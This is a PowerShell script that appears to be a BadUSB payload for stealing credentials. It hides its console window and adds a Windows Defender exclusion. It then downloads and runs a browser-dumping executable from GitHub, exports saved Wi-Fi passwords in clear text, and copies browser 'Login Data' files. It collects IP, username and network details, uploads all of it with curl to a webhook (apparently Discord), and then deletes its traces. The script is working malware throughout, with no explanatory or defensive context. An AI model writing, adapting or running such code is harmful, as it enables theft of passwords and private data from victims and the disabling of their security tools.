
Add-Type -Name Win -Namespace P -MemberDefinition '[DllImport("kernel32.dll")]public static extern System.IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(System.IntPtr hWnd,int nCmdShow);';$h=[P.Win]::GetConsoleWindow();[P.Win]::ShowWindow($h,2)


#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://raw.githubusercontent.com/GamehunterKaan/BadUSB-Browser/refs/heads/main/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random

$e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"

#scrape the localappdata for password files
$zip="$env:LOCALAPPDATA\Temp\LoginDataBackup.zip";$tempDir=Join-Path $env:LOCALAPPDATA "Temp\LoginDataTemp";Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue;New-Item -Path $tempDir -ItemType Directory -Force|Out-Null;Get-ChildItem $env:LOCALAPPDATA -Filter "Login Data" -Recurse -Force -ErrorAction SilentlyContinue|ForEach-Object{$p=Split-Path $_.FullName -Parent;$gp=Split-Path $p -Parent;if((Split-Path $gp -Leaf)-ieq"User Data"){$vendor=Split-Path (Split-Path $gp -Parent) -Leaf;$profile=Split-Path $p -Leaf;$label="$vendor-$profile-LoginData";Copy-Item $_.FullName (Join-Path $tempDir $label) -Force -ErrorAction SilentlyContinue}};if(Test-Path $zip){Remove-Item $zip -Force};if(Get-ChildItem $tempDir){Compress-Archive -Path (Join-Path $tempDir '*') -DestinationPath $zip -Force};Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

$ip_add = try{(Invoke-RestMethod "https://api.ipify.org?format=json" -ErrorAction Stop).ip}catch{""}

$whoami_content = whoami

ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file


#send to discord

#send http
& curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" -F "file4=@$env:appdata\Microsoft\dump\dump.zip" $wh > $null 2>&1

cls # clear console
# cleanup

cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"
Remove-Item -Path "$e\wifi.txt"
Remove-Item -Path "$e\ipcfg.txt"
Remove-Item -Path "$zip"
